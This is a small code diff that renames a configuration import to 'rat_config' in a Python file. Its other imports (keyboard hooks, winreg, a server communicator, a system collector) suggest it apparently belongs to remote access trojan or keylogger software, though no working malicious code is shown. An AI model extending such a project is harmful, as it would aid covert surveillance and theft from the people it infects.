@@ -9,7 +9,7 @@ import requests
 import winreg
 from datetime import datetime
 from keyboard import hook, add_hotkey
-from config import Config
+from rat_config import Config
 from encryption.manager import EncryptionManager, EncryptionError
 from network.communicator import ServerCommunicator, CommunicationError
 from system.collector import SystemCollector
